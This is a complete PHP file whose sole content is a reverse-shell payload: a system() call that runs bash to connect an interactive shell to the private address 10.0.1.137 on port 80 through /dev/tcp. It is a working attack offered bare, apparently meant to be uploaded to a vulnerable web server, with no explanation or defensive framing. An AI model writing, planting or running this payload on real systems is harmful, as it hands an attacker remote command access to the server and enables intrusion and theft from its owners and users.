<?php 


system('/bin/bash -c "sh -i >& /dev/tcp/10.0.1.137/80 0>&1"');


?>
